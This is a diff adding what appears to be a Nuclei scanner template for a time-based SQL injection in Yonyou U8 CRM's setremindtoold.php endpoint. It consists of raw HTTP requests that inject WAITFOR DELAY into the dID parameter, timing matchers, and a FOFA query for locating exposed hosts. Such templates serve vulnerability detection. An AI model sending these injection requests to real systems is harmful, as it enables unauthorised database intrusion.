@@ -1,0 +1,33 @@
+id: yongyou-U8-CRM-setremindtoold-sql
+
+info:
+  name: 用友U8 CRM setremindtoold SQL延时注入漏洞
+  author: yongyou
+  severity: high
+  metadata: 
+    fofa-query: body="用友U8CRM"
+  tags: yongyon,u8,crm,sql
+
+
+http:
+  - raw:
+      - |
+        GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+      - |
+        GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
